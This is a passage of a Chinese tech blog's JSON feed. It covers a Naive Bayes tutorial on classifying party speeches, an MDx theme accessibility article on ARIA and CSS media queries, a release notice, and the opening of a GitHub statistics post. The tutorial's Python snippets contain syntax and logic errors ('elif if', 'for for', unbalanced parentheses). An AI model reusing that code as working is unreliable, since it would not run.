个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 